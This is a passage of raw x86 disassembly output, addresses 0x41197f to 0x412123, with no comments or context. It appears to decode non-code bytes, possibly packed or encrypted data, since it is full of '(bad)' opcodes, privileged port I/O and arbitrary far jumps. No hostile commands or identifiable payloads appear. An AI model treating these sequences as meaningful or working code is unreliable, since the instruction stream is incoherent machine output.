  41197f:	push   ss
  411980:	stos   DWORD PTR es:[edi],eax
  411981:	retf   0x26b8
  411984:	and    BYTE PTR [eax],cl
  411986:	jo     0x411967
  411988:	fmul   QWORD PTR [esi+0x25]
  41198b:	int3   
  41198c:	outs   dx,DWORD PTR ds:[esi]
  41198d:	lock into 
  41198f:	inc    edi
  411990:	push   ss
  411991:	(bad)  
  411992:	clc    
  411993:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411994:	fst    st(0)
  411996:	mov    esp,0x3584ec9d
  41199b:	adc    al,0x81
  41199d:	arpl   WORD PTR [edx],bx
  41199f:	fstp   QWORD PTR [ecx+esi*8+0x37]
  4119a3:	jmp    0x411926
  4119a5:	popa   
  4119a6:	int    0xef
  4119a8:	out    dx,al
  4119a9:	adc    BYTE PTR [eax-0x46],dh
  4119ac:	inc    edi
  4119ad:	ret    
  4119ae:	xor    dl,bl
  4119b0:	or     dh,BYTE PTR [esi]
  4119b2:	mov    dl,0xb
  4119b4:	pop    ebx
  4119b5:	xchg   esi,eax
  4119b6:	clc    
  4119b7:	push   ecx
  4119b9:	lods   al,BYTE PTR ds:[esi]
  4119ba:	call   0x5f93:0xecb138a7
  4119c1:	cmp    BYTE PTR [ebx],cl
  4119c3:	test   DWORD PTR [edi],edx
  4119c5:	rdmsr  
  4119c7:	mov    ecx,0xa84080fd
  4119cc:	xchg   DWORD PTR [edx],ecx
  4119ce:	pusha  
  4119cf:	(bad)  
  4119d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119d1:	retf   
  4119d2:	mov    edx,0x6a77687b
  4119d7:	mov    cl,0xa8
  4119d9:	push   ecx
  4119da:	mov    BYTE PTR [ecx-0x308d736f],0xd0
  4119e1:	in     eax,0x60
  4119e3:	jg     0x4119b1
  4119e5:	xchg   edi,eax
  4119e6:	call   0x3ac09ef
  4119eb:	pop    ebx
  4119ec:	inc    ebx
  4119ed:	xchg   ebx,ecx
  4119ef:	jmp    0x413d7d
  4119f4:	popf   
  4119f5:	add    eax,0xa840804
  4119fa:	xchg   ecx,eax
  4119fb:	adc    bl,0x9b
  4119fe:	pop    eax
  4119ff:	in     al,dx
  411a00:	outs   dx,BYTE PTR ds:[esi]
  411a01:	mov    eax,0x8a0b37b7
  411a06:	add    DWORD PTR [ebx-0x7c7ca1f4],0xffffffa2
  411a0d:	das    
  411a0e:	or     eax,DWORD PTR [edx]
  411a10:	or     DWORD PTR [ebx+0x35],esi
  411a13:	pop    esi
  411a14:	js     0x4119ca
  411a16:	pop    edx
  411a17:	cmp    DWORD PTR [edx+0x42],0xe4760f6d
  411a1e:	cmp    al,0xf0
  411a20:	pop    eax
  411a21:	in     al,dx
  411a22:	sbb    cl,bl
  411a24:	cli    
  411a25:	pop    ds
  411a26:	mov    DWORD PTR [edx-0x21],esi
  411a29:	test   al,0x8d
  411a2b:	pop    edx
  411a2c:	jnp    0x411a2d
  411a2e:	jno    0x411a89
  411a30:	out    dx,al
  411a31:	out    dx,al
  411a32:	leave  
  411a33:	mov    al,0x64
  411a35:	xchg   edi,eax
  411a36:	in     eax,dx
  411a37:	mov    ah,0x8
  411a39:	cmp    BYTE PTR [eax],bl
  411a3b:	add    eax,0x758ee002
  411a40:	xchg   ebp,eax
  411a41:	add    BYTE PTR [esi],0x1f
  411a44:	fucomp st(5)
  411a46:	stos   BYTE PTR es:[edi],al
  411a47:	xor    BYTE PTR [esp+eax*8+0x3cd8205],0x18
  411a4f:	js     0x411a35
  411a51:	cs mov al,0xc5
  411a54:	push   ebx
  411a55:	push   ds
  411a56:	pop    es
  411a57:	pushf  
  411a58:	mov    al,0xcc
  411a5a:	clc    
  411a5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a5c:	es nop
  411a5e:	and    DWORD PTR [edx-0x42],eax
  411a61:	add    ebp,ebx
  411a63:	mov    BYTE PTR [ecx+esi*8],bh
  411a66:	scas   al,BYTE PTR es:[edi]
  411a67:	lea    esi,[ebx]
  411a69:	ins    BYTE PTR es:[edi],dx
  411a6a:	lods   eax,DWORD PTR ds:[esi]
  411a6b:	enter  0x5b6b,0x8e
  411a6f:	xor    eax,0x41686b20
  411a74:	dec    esp
  411a75:	adc    eax,0xaa13a079
  411a7a:	loop   0x411a5d
  411a7c:	jl     0x411af7
  411a7e:	adc    bl,dh
  411a80:	stos   DWORD PTR es:[edi],eax
  411a81:	cmp    ch,BYTE PTR [edx+edx*2]
  411a84:	test   BYTE PTR [edi-0x2e7bc49b],cl
  411a8a:	xlat   BYTE PTR ds:[ebx]
  411a8b:	out    0xe9,eax
  411a8d:	xor    cl,BYTE PTR [eax+0x3ae00edb]
  411a93:	mov    ecx,0xc1244c09
  411a98:	push   edx
  411a99:	mov    esp,0xbf06ff85
  411a9e:	adc    ah,BYTE PTR [ebx+0x268c9534]
  411aa4:	pop    eax
  411aa5:	aas    
  411aa6:	and    al,BYTE PTR [ebp+0x5b]
  411aa9:	push   eax
  411aaa:	sbb    al,0xa8
  411aac:	push   cs
  411aad:	stos   BYTE PTR es:[edi],al
  411aae:	xor    BYTE PTR [edx+0x86dc307],al
  411ab4:	mov    edx,0xdc1b3a25
  411ab9:	(bad)  
  411aba:	jae    0x411a4e
  411abc:	sti    
  411abd:	push   esi
  411abe:	mov    dh,0xdf
  411ac0:	mov    ch,0xa5
  411ac2:	inc    ebp
  411ac3:	mov    ch,0xdf
  411ac5:	lods   eax,DWORD PTR ds:[esi]
  411ac6:	jae    0x411a78
  411ac8:	cs scas eax,DWORD PTR es:[edi]
  411aca:	sbb    edx,DWORD PTR [esi-0x776ca75a]
  411ad0:	and    eax,0xeaad2a7
  411ad5:	out    dx,al
  411ad6:	cld    
  411ad7:	push   0x31
  411ad9:	aaa    
  411ada:	leave  
  411adb:	in     eax,0x45
  411add:	gs in  eax,dx
  411adf:	and    dl,BYTE PTR [ecx-0x16]
  411ae2:	and    DWORD PTR [esi],ecx
  411ae4:	push   0xfffffffe
  411ae6:	adc    ebx,DWORD PTR [edx]
  411ae8:	scas   eax,DWORD PTR es:[edi]
  411ae9:	jbe    0x411b0f
  411aeb:	jns    0x411ab0
  411aed:	add    cl,BYTE PTR [edi+0x20]
  411af0:	int3   
  411af1:	cdq    
  411af2:	cmp    BYTE PTR [esi+eax*2+0x4cd2aa4a],al
  411af9:	or     eax,0xcc3e9e30
  411afe:	and    eax,0x326ef395
  411b03:	jnp    0x411aa3
  411b05:	sbb    edi,esp
  411b07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b08:	push   edx
  411b09:	popa   
  411b0a:	dec    eax
  411b0b:	sbb    eax,0xfae63904
  411b10:	add    DWORD PTR [edx-0x73],edi
  411b13:	xchg   ecx,eax
  411b14:	pop    ecx
  411b15:	or     BYTE PTR [ebp-0x569d464e],bl
  411b1b:	dec    esp
  411b1c:	call   0xcdc9:0x8a2f63db
  411b23:	push   ss
  411b24:	(bad)  
  411b25:	and    esi,DWORD PTR [ebx-0x6d]
  411b28:	rol    BYTE PTR [ebx-0x31fbbe34],1
  411b2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b2f:	adc    eax,0x7efb9b92
  411b34:	inc    edi
  411b35:	in     eax,0x9f
  411b37:	xchg   esp,eax
  411b38:	dec    ecx
  411b39:	cmc    
  411b3a:	in     eax,dx
  411b3b:	(bad)  
  411b3c:	cld    
  411b3d:	rol    BYTE PTR [eax-0xf],0xe6
  411b41:	int3   
  411b42:	icebp  
  411b43:	inc    esp
  411b44:	test   DWORD PTR [ecx],eax
  411b46:	mov    ch,0xea
  411b48:	dec    edx
  411b49:	or     al,0xab
  411b4b:	aas    
  411b4c:	jecxz  0x411aeb
  411b4e:	shr    BYTE PTR [ecx+0x1b6dd637],1
  411b54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b55:	leave  
  411b56:	clc    
  411b57:	(bad)  
  411b59:	push   esi
  411b5a:	mov    WORD PTR [eax],ss
  411b5c:	adc    bh,BYTE PTR [ecx-0x78]
  411b5f:	(bad)  
  411b60:	not    DWORD PTR [edi+eax*4-0xe]
  411b64:	pop    ecx
  411b65:	sbb    ebp,eax
  411b67:	sahf   
  411b68:	inc    BYTE PTR [esi]
  411b6a:	test   DWORD PTR [ebp-0x7e507005],edx
  411b70:	mov    ebx,0x644e2649
  411b75:	test   DWORD PTR ds:0xf1dc49f1,edi
  411b7b:	sahf   
  411b7c:	push   0xffffffe2
  411b7e:	mov    eax,0x9364c455
  411b83:	out    dx,al
  411b84:	pop    eax
  411b85:	mov    si,0x5626
  411b89:	xchg   edi,eax
  411b8a:	add    cl,BYTE PTR [esi+0x3a]
  411b8d:	imul   edx,esi,0x5d4d9867
  411b93:	in     eax,dx
  411b94:	test   DWORD PTR [ebx-0x493d718e],ebx
  411b9a:	arpl   cx,cx
  411b9c:	xor    ecx,DWORD PTR [eax]
  411b9e:	xchg   ebp,eax
  411b9f:	jns    0x411b6a
  411ba1:	sub    BYTE PTR [edi+0x69],bl
  411ba4:	fisub  WORD PTR [ebx+0x13fb13d8]
  411baa:	js     0x411b70
  411bac:	(bad)  
  411bad:	sbb    eax,0x7768f198
  411bb2:	add    eax,0x67ec1f2
  411bb7:	xlat   BYTE PTR ds:[ebx]
  411bb8:	dec    ecx
  411bb9:	mov    edx,ebp
  411bbb:	inc    esi
  411bbc:	loopne 0x411bc9
  411bbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bbf:	js     0x411b50
  411bc1:	pushf  
  411bc2:	and    BYTE PTR [edi-0x6ff76fa5],ah
  411bc8:	inc    edi
  411bc9:	test   eax,0x4f4df794
  411bce:	icebp  
  411bcf:	add    eax,0x9386f335
  411bd4:	ins    DWORD PTR es:[edi],dx
  411bd5:	dec    ebx
  411bd6:	sbb    esi,esi
  411bd8:	add    bh,BYTE PTR [esi-0x7b]
  411bdb:	and    BYTE PTR [esi-0x7c210a7],bl
  411be1:	mov    ebx,0x7ff796e0
  411be6:	or     BYTE PTR [eax-0x744e499],bl
  411bec:	sbb    eax,0x28984c95
  411bf1:	push   cs
  411bf2:	loopne 0x411c26
  411bf4:	imul   ebp,DWORD PTR [ecx+0x1e497f4d],0x2e
  411bfb:	xchg   ecx,eax
  411bfc:	inc    ebx
  411bfd:	shl    DWORD PTR [esp+ecx*1],0x61
  411c01:	data16 repz fstp DWORD PTR [esi]
  411c05:	xor    edi,DWORD PTR [esp+esi*2+0xf35c1d6]
  411c0c:	mov    DWORD PTR [ecx-0x66],edi
  411c0f:	fwait
  411c10:	or     bl,BYTE PTR [ecx]
  411c12:	stos   BYTE PTR es:[edi],al
  411c13:	cmc    
  411c14:	jbe    0x411c7d
  411c16:	ss cli 
  411c18:	repnz fnstcw WORD PTR [ebp-0xd]
  411c1c:	fist   DWORD PTR ds:0x7a36058e
  411c22:	mov    al,ds:0x7af15cac
  411c27:	add    DWORD PTR [edx+0x61],0xe05dd101
  411c2e:	clc    
  411c2f:	jecxz  0x411bc9
  411c31:	mov    eax,ds:0xce2e30f2
  411c36:	inc    ebx
  411c37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c38:	es lock out dx,eax
  411c3b:	xor    eax,0xf091b955
  411c40:	sbb    ebp,DWORD PTR [ecx]
  411c42:	dec    eax
  411c43:	or     ch,BYTE PTR [esp+ecx*8-0x678796b8]
  411c4a:	nop
  411c4b:	les    esp,FWORD PTR [ecx]
  411c4d:	jmp    0x411c42
  411c4f:	pop    ebx
  411c50:	mov    ds:0xce095ce2,eax
  411c55:	jg     0x411c76
  411c57:	int3   
  411c58:	inc    esi
  411c59:	add    al,0xe8
  411c5b:	push   ecx
  411c5c:	mov    ah,0x9a
  411c5e:	repz loopne 0x411c34
  411c61:	jmp    0x35a6:0x45261865
  411c68:	pop    ecx
  411c69:	arpl   WORD PTR [edx-0x8],bp
  411c6c:	sub    dh,bl
  411c6e:	mov    esp,0x3ded0582
  411c73:	mov    ecx,0x35dc56b7
  411c78:	xchg   DWORD PTR [ecx+0x2dbc3570],esp
  411c7e:	xchg   ecx,eax
  411c7f:	cmp    cl,dl
  411c81:	loopne 0x411c87
  411c83:	jl     0x411cf5
  411c85:	rcl    DWORD PTR [edx+0x2872d535],cl
  411c8b:	jb     0x411c4a
  411c8d:	xchg   dh,al
  411c8f:	jmp    0x880c:0x18ed8e
  411c96:	mov    ebp,DWORD PTR [ecx-0x79]
  411c99:	dec    ebx
  411c9a:	daa    
  411c9b:	mov    al,0x97
  411c9d:	fnstcw WORD PTR [ecx]
  411c9f:	mov    ebp,0xcb3f87b4
  411ca4:	or     BYTE PTR [ebp-0x58],al
  411ca7:	fistp  DWORD PTR [ebx]
  411ca9:	cmc    
  411caa:	aad    0x88
  411cac:	pop    ebp
  411cad:	scas   al,BYTE PTR es:[edi]
  411cae:	jge    0x411c7f
  411cb0:	inc    ecx
  411cb1:	call   0xae8b174f
  411cb6:	aad    0xf8
  411cb8:	in     eax,dx
  411cb9:	dec    ebp
  411cba:	call   0xdeb8:0xa876c6b2
  411cc1:	jbe    0x411c6d
  411cc3:	fmul   st,st(1)
  411cc5:	adc    DWORD PTR [ebp+0x2c646dac],esp
  411ccb:	push   esi
  411ccc:	sar    DWORD PTR [edx+0x3e],1
  411ccf:	mov    ch,0x63
  411cd1:	out    0x15,eax
  411cd3:	adc    DWORD PTR [ebx+0x6f64fa4c],ebp
  411cd9:	repz pop ebp
  411cdb:	and    BYTE PTR [esi+0x28],dh
  411cde:	jo     0x411d40
  411ce0:	and    al,0x5f
  411ce2:	cmp    eax,DWORD PTR [edx-0x3e]
  411ce5:	fsub   DWORD PTR [eax+0x3ec737b2]
  411ceb:	fucom  st(6)
  411ced:	lahf   
  411cee:	jle    0x411d14
  411cf0:	xchg   ebx,eax
  411cf1:	push   eax
  411cf2:	test   BYTE PTR [eax+0x17946858],bl
  411cf8:	push   0x2efa9e97
  411cfd:	into   
  411cfe:	mov    edi,0x8f894813
  411d03:	lods   eax,DWORD PTR ds:[esi]
  411d04:	pusha  
  411d05:	add    al,0xf9
  411d07:	mov    ds:0xb6d324a6,eax
  411d0c:	pop    esp
  411d0d:	addr16 or eax,0xdf7039d8
  411d13:	(bad)  
  411d14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d15:	shl    BYTE PTR [eax-0x1dd9d62b],1
  411d1b:	pop    esp
  411d1c:	mov    esp,0xbb7714e7
  411d21:	cli    
  411d22:	mov    al,0x98
  411d24:	pop    esi
  411d25:	or     al,0xb7
  411d27:	cwde   
  411d28:	jg     0x411d2f
  411d2a:	xchg   ebp,eax
  411d2b:	bound  edx,QWORD PTR [bx+si]
  411d2e:	cmp    ebx,ebx
  411d30:	test   BYTE PTR [eax-0x50],bl
  411d33:	push   esi
  411d34:	xor    al,0x46
  411d36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d37:	fnsave [edx-0x512b4233]
  411d3d:	test   eax,0x256b2f85
  411d42:	push   edx
  411d43:	gs sub al,0xb9
  411d46:	leave  
  411d47:	mov    bh,dl
  411d49:	and    ecx,ebp
  411d4b:	inc    esp
  411d4c:	pop    edx
  411d4d:	cmp    esi,edx
  411d4f:	adc    DWORD PTR [ebp+edi*1+0x56],esi
  411d53:	fwait
  411d54:	es test eax,0x513eeaeb
  411d5a:	push   es
  411d5b:	jmp    FWORD PTR [eax]
  411d5d:	and    ecx,DWORD PTR [esi+ebx*1+0x6872abab]
  411d64:	mov    ebx,edi
  411d66:	push   ds
  411d67:	popf   
  411d68:	or     al,0x8b
  411d6a:	jae    0x411cfc
  411d6c:	(bad)  
  411d6d:	jmp    0x411d41
  411d6f:	repnz popf 
  411d71:	cmp    eax,0x536597b3
  411d76:	push   ebx
  411d77:	dec    edx
  411d78:	jp     0x411dea
  411d7a:	push   esp
  411d7b:	out    0xa1,al
  411d7d:	sti    
  411d7e:	cdq    
  411d7f:	(bad)  [esi*8+0x4fac1675]
  411d86:	fist   DWORD PTR [ecx]
  411d88:	popa   
  411d89:	icebp  
  411d8a:	(bad)  
  411d8b:	fcomp  QWORD PTR [ebx-0x19694889]
  411d91:	push   esp
  411d92:	sub    al,0x9a
  411d94:	retf   0xa768
  411d97:	sub    BYTE PTR [edi],bl
  411d99:	sbb    al,0x1c
  411d9b:	inc    esp
  411d9c:	push   ss
  411d9d:	xchg   esi,eax
  411d9e:	pop    es
  411d9f:	(bad)  
  411da0:	mov    ebx,0xcbccefcf
  411da5:	sbb    al,0xf7
  411da7:	and    DWORD PTR [esi],0xc8a0cbb8
  411dad:	lds    edx,FWORD PTR [edi+0x3b]
  411db0:	mov    BYTE PTR [eax],dh
  411db2:	lods   al,BYTE PTR ds:[esi]
  411db3:	xchg   esi,eax
  411db4:	ror    DWORD PTR [esi+ebp*2-0xa],0xe1
  411db9:	add    BYTE PTR [eax],cl
  411dbb:	(bad)  
  411dbc:	clc    
  411dbd:	inc    ecx
  411dbe:	rcl    BYTE PTR [eax],1
  411dc0:	mov    edx,DWORD PTR [ecx]
  411dc2:	cwde   
  411dc3:	shr    BYTE PTR cs:[ebp-0x6d6471d9],cl
  411dca:	frstor [esi]
  411dcc:	(bad)  
  411dcd:	lahf   
  411dce:	lds    eax,FWORD PTR [ebp-0x69]
  411dd1:	mov    ds:0x88bc04dc,al
  411dd6:	rcr    DWORD PTR [esi],0x32
  411dd9:	cmp    BYTE PTR [ebx-0x25],dh
  411ddc:	mov    ebx,0x90d610a5
  411de1:	mov    ecx,0x7ee41e1e
  411de6:	jmp    0x7fb4b682
  411deb:	add    al,0x38
  411ded:	into   
  411dee:	js     0x411e30
  411df0:	xor    edi,DWORD PTR [ebp+0x28]
  411df3:	mov    eax,0xf66438e1
  411df8:	add    al,0xd6
  411dfa:	ja     0x411dfd
  411dfc:	jne    0x411e78
  411dfe:	sbb    al,0xa
  411e00:	pop    edi
  411e01:	sbb    esi,ebx
  411e03:	sub    al,cl
  411e05:	or     BYTE PTR [edx-0x5a],dh
  411e08:	xchg   DWORD PTR [eax+0x71c8f9c5],ebx
  411e0e:	dec    ebp
  411e0f:	xchg   esp,eax
  411e10:	out    0xe0,al
  411e12:	mov    dh,0x9
  411e14:	enter  0x3b31,0x50
  411e18:	jl     0x411e5e
  411e1a:	shl    DWORD PTR [ecx+0x5],cl
  411e1d:	test   BYTE PTR [ecx-0x56],0xd0
  411e21:	push   cs
  411e22:	jno    0x411e10
  411e24:	popa   
  411e25:	jmp    FWORD PTR [eax-0x1ed587e3]
  411e2b:	retf   0xaff5
  411e2e:	ror    DWORD PTR ds:0xbc7d7b74,0x96
  411e35:	ja     0x411e0f
  411e37:	sti    
  411e38:	xchg   ecx,eax
  411e39:	shl    BYTE PTR ds:0x1456c726,0xfc
  411e40:	ins    DWORD PTR es:[edi],dx
  411e41:	mov    ebx,0x4b75544c
  411e46:	in     al,0xde
  411e48:	inc    esp
  411e49:	out    dx,eax
  411e4a:	lea    edx,[bp+di]
  411e4d:	fcmovnbe st,st(5)
  411e4f:	fucomip st,st(5)
  411e51:	jno    0x411eb9
  411e53:	pop    ecx
  411e54:	test   al,0xc9
  411e56:	pop    ebx
  411e57:	je     0x411ded
  411e59:	psrlq  mm2,QWORD PTR [edi-0x2f]
  411e5d:	cdq    
  411e5e:	xlat   BYTE PTR ds:[ebx]
  411e5f:	cli    
  411e60:	test   eax,0xd574bec2
  411e65:	xor    BYTE PTR [edi],bl
  411e67:	int3   
  411e68:	jae    0x411ea7
  411e6a:	jno    0x411e9d
  411e6c:	adc    al,BYTE PTR [eax]
  411e6e:	mov    ebp,0x911e2b6c
  411e73:	nop
  411e74:	(bad)  
  411e76:	mov    eax,ds:0xfbfab10
  411e7b:	sub    ebp,DWORD PTR [esi]
  411e7d:	and    al,0x6e
  411e7f:	das    
  411e80:	push   edx
  411e81:	jg     0x411e27
  411e83:	test   BYTE PTR [esi+ecx*1],0xf1
  411e87:	lea    esi,[ebx]
  411e89:	enter  0xd5b8,0xbc
  411e8d:	push   cs
  411e8e:	jmp    0xc679:0x71b8a4e4
  411e95:	mov    cl,0x6a
  411e97:	in     eax,0x3
  411e99:	gs stos BYTE PTR es:[edi],al
  411e9b:	dec    ebp
  411e9c:	mov    edi,0xec90ac02
  411ea1:	sub    eax,0xfd50684d
  411ea6:	push   0x77
  411ea8:	xchg   ecx,eax
  411ea9:	fldenv [eax-0x6a8a4276]
  411eaf:	das    
  411eb0:	test   al,bh
  411eb2:	mov    edi,0x5d326655
  411eb7:	or     dh,BYTE PTR [edx]
  411eb9:	dec    esp
  411eba:	(bad)  
  411ebc:	loopne 0x411ebc
  411ebe:	aam    0x57
  411ec0:	pushf  
  411ec1:	add    edi,DWORD PTR [edi-0x67]
  411ec4:	mov    BYTE PTR [ebx],0x3f
  411ec7:	loope  0x411e9e
  411ec9:	ins    BYTE PTR es:[edi],dx
  411eca:	sub    al,0x8
  411ecc:	dec    esp
  411ecd:	pavgb  mm3,mm6
  411ed0:	aam    0x11
  411ed2:	or     eax,0x1b306646
  411ed7:	popa   
  411ed8:	mov    esp,0x538d4d82
  411edd:	cdq    
  411ede:	cmp    BYTE PTR [esi],cl
  411ee0:	stc    
  411ee1:	jns    0x411ec6
  411ee3:	jle    0x411edf
  411ee5:	cmp    al,0xdf
  411ee7:	xchg   ebx,eax
  411ee8:	cs das 
  411eea:	push   ebx
  411eeb:	mov    ebx,0x2b42d7ff
  411ef0:	mov    edi,0xf0cb62b2
  411ef5:	outs   dx,DWORD PTR ds:[esi]
  411ef6:	(bad)  
  411ef7:	pusha  
  411ef8:	outs   dx,BYTE PTR ds:[esi]
  411ef9:	xor    eax,0xe7bc3602
  411efe:	int3   
  411eff:	and    eax,0xdf828f66
  411f04:	xchg   ebp,eax
  411f05:	pop    ebx
  411f06:	xlat   BYTE PTR ds:[ebx]
  411f07:	or     esi,ecx
  411f09:	or     dh,BYTE PTR [eax-0x21]
  411f0c:	jge    0x411f15
  411f0e:	arpl   ax,di
  411f10:	sub    edi,esp
  411f12:	call   0x2e46e2b4
  411f17:	push   fs
  411f19:	xchg   esi,eax
  411f1a:	cmc    
  411f1b:	test   BYTE PTR [esi+ebx*8],bh
  411f1e:	add    al,0xec
  411f20:	xlat   BYTE PTR ds:[ebx]
  411f21:	adc    ch,BYTE PTR [ecx-0x2b44e25b]
  411f27:	ja     0x411f31
  411f29:	popf   
  411f2a:	pop    ebp
  411f2b:	shr    eax,0x2c
  411f2e:	rcr    BYTE PTR [eax],0x31
  411f31:	loop   0x411f3e
  411f33:	rol    BYTE PTR [esi+0x3c1880eb],1
  411f39:	ror    BYTE PTR [ecx],0x7b
  411f3c:	les    edx,FWORD PTR [edx]
  411f3e:	ror    DWORD PTR [edi*2-0x3aef539d],1
  411f45:	mov    esi,0x21388363
  411f4a:	pop    edx
  411f4b:	cwde   
  411f4c:	jae    0x411edf
  411f4e:	cmp    al,0xca
  411f50:	push   ebx
  411f51:	jge    0x411fc5
  411f53:	cdq    
  411f54:	or     DWORD PTR [esi+0x436d4b3],edx
  411f5a:	xor    DWORD PTR [esi+0x1c],esi
  411f5d:	mov    edi,0x7f637ab0
  411f62:	pusha  
  411f63:	int3   
  411f64:	iret   
  411f65:	mov    dh,0xb9
  411f67:	dec    esp
  411f68:	loopne 0x411ef3
  411f6a:	(bad)
  411f6e:	imul   esi,edi,0x5f
  411f71:	mov    WORD PTR [ebx-0x77a179f1],fs
  411f77:	jmp    0xe9875464
  411f7c:	lahf   
  411f7d:	cld    
  411f7e:	push   edi
  411f7f:	adc    DWORD PTR [eax+0x5c],ebp
  411f82:	cmp    BYTE PTR [esi-0x6cd243e],dh
  411f88:	jle    0x411f59
  411f8a:	(bad)  
  411f8b:	lahf   
  411f8c:	jge    0x411fc4
  411f8e:	or     DWORD PTR [eax+0x24f209e6],eax
  411f94:	xchg   edi,eax
  411f95:	lock popa 
  411f97:	dec    esi
  411f98:	mov    edx,0x30139511
  411f9d:	es jmp 0x411ff9
  411fa0:	(bad)  [ecx+ecx*8]
  411fa3:	mov    ds:0x202a9f39,eax
  411fa8:	(bad)  
  411fa9:	daa    
  411faa:	mov    ?,WORD PTR [esi-0x23]
  411fad:	rol    esp,0x77
  411fb0:	sub    DWORD PTR [ebp+0x7562e1e3],edx
  411fb6:	inc    edi
  411fb7:	sti    
  411fb8:	cmp    eax,0xce27f03e
  411fbd:	ss enter 0xa281,0x73
  411fc2:	xchg   cl,bl
  411fc4:	mov    edx,0xcb59a977
  411fc9:	int    0x38
  411fcb:	hlt    
  411fcc:	popa   
  411fcd:	xor    dh,BYTE PTR [ecx+0x59dab503]
  411fd3:	dec    ebp
  411fd4:	inc    ecx
  411fd5:	push   esp
  411fd6:	or     esi,ecx
  411fd8:	sbb    al,0xcd
  411fda:	jne    0x411fdd
  411fdc:	stos   BYTE PTR es:[edi],al
  411fdd:	fnsave [esp+ecx*8-0x117e1d79]
  411fe4:	sub    BYTE PTR [ecx+eax*2-0x639a15f6],al
  411feb:	ror    bh,0x9a
  411fee:	daa    
  411fef:	push   0x3f
  411ff1:	or     esp,DWORD PTR [edi]
  411ff3:	jmp    0x411f93
  411ff5:	das    
  411ff6:	mov    esp,0x266ef74
  411ffb:	pushf  
  411ffc:	sub    al,0x90
  411ffe:	sar    BYTE PTR [ebx-0x54ade332],1
  412004:	leave  
  412005:	xchg   edi,eax
  412006:	push   0x5c
  412008:	xchg   ecx,eax
  412009:	(bad)  
  41200a:	and    eax,0x2d44bc6
  41200f:	sub    DWORD PTR [edx-0x620c3001],ebx
  412015:	dec    ebp
  412016:	pushf  
  412017:	mov    bl,0xa1
  412019:	fxch   st(5)
  41201b:	outs   dx,BYTE PTR ds:[esi]
  41201c:	push   ebx
  41201d:	sar    DWORD PTR ds:0x261d9468,1
  412023:	or     DWORD PTR [esi-0x3e],esi
  412026:	add    al,0x93
  412028:	repnz and DWORD PTR [edi],eax
  41202b:	and    esi,esp
  41202d:	cmp    DWORD PTR [edx],ebp
  41202f:	inc    edi
  412031:	outs   dx,DWORD PTR ds:[esi]
  412032:	inc    ebx
  412033:	push   edx
  412034:	dec    esp
  412035:	push   cs
  412036:	push   ebx
  412037:	mov    ?,WORD PTR [ecx]
  412039:	in     al,0x1c
  41203b:	and    BYTE PTR [eax],bh
  41203d:	aaa    
  41203e:	cs jno 0x412009
  412041:	mov    dh,0x53
  412043:	xchg   ebp,eax
  412044:	sbb    eax,ecx
  412046:	add    BYTE PTR [edx+ecx*4+0x1],0x0
  41204b:	cwde   
  41204c:	enter  0x47d5,0x19
  412050:	pop    esp
  412051:	inc    ecx
  412052:	cmp    al,0x6d
  412054:	dec    ebx
  412055:	fisub  DWORD PTR [eax]
  412057:	cdq    
  412058:	outs   dx,DWORD PTR ds:[esi]
  412059:	adc    ah,dh
  41205b:	(bad)  [esi]
  41205d:	enter  0xf7fb,0x66
  412061:	pop    ss
  412062:	shl    DWORD PTR [edx+0x2b],1
  412065:	push   edi
  412066:	aam    0xf9
  412068:	push   edi
  412069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41206a:	(bad)  
  41206b:	cs ret 
  41206d:	sbb    DWORD PTR [edx],ebp
  41206f:	xchg   BYTE PTR [ecx+esi*4-0x4839ca5f],ch
  412076:	jmp    0x41203a
  412078:	or     eax,0x4a9f56cc
  41207d:	xchg   esi,eax
  41207e:	ror    DWORD PTR [esp+edi*2-0x7895626d],cl
  412085:	cmc    
  412086:	mov    esp,0x9bceafe7
  41208b:	mov    ds:0x12c2412a,al
  412090:	sub    al,0xb
  412092:	pop    ebx
  412093:	add    al,0x12
  412095:	xor    DWORD PTR [edx+ebx*4-0x6d],esi
  412099:	test   eax,0x8dc590f6
  41209e:	cli    
  41209f:	mov    al,0xd6
  4120a1:	mov    dl,0x10
  4120a3:	ins    DWORD PTR es:[edi],dx
  4120a4:	sahf   
  4120a5:	xor    BYTE PTR [esi+0x10135178],dh
  4120ab:	fidivr DWORD PTR [edi+0x43]
  4120ae:	cmp    esp,DWORD PTR [esi-0x3a3078a0]
  4120b4:	mov    ch,0x35
  4120b6:	mov    al,0x90
  4120b8:	scas   al,BYTE PTR es:[edi]
  4120b9:	stc    
  4120ba:	jbe    0x412049
  4120bc:	arpl   WORD PTR [ecx],dx
  4120be:	mov    al,0x41
  4120c0:	(bad)  
  4120c1:	ins    BYTE PTR es:[edi],dx
  4120c2:	xlat   BYTE PTR ds:[ebx]
  4120c3:	push   es
  4120c4:	arpl   WORD PTR [ebp+0x70f64248],si
  4120ca:	fwait
  4120cb:	scas   eax,DWORD PTR es:[edi]
  4120cc:	adc    eax,0x6d2cd6a6
  4120d1:	(bad)  
  4120d2:	test   eax,0x6a41df4
  4120d7:	test   BYTE PTR [ebx+edx*4+0x4b],al
  4120db:	ds repz daa 
  4120de:	and    esi,DWORD PTR ds:0xba47f47f
  4120e4:	es in  al,dx
  4120e6:	or     al,0x84
  4120e8:	fucom  st(5)
  4120ea:	push   0xdb9ca6f8
  4120ef:	jmp    0x412109
  4120f1:	aaa    
  4120f2:	inc    edi
  4120f3:	inc    ebx
  4120f4:	dec    edi
  4120f5:	jno    0x412165
  4120f7:	packsswb mm4,QWORD PTR ds:0x6cd5bd06
  4120fe:	push   0xe59ccf45
  412103:	add    dh,BYTE PTR [ebx]
  412105:	dec    esp
  412106:	xor    BYTE PTR [ebx],al
  412108:	enter  0x51b5,0x55
  41210c:	cs cwde 
  41210e:	mov    eax,0xac051aa7
  412113:	loopne 0x412113
  412115:	mov    cl,0xda
  412117:	mov    ?,WORD PTR ds:0x57e7c0ee
  41211d:	sar    DWORD PTR [ecx],cl
  41211f:	fmul   st(6),st
  412121:	jecxz  0x4120a3
  412123:	int    0xd4
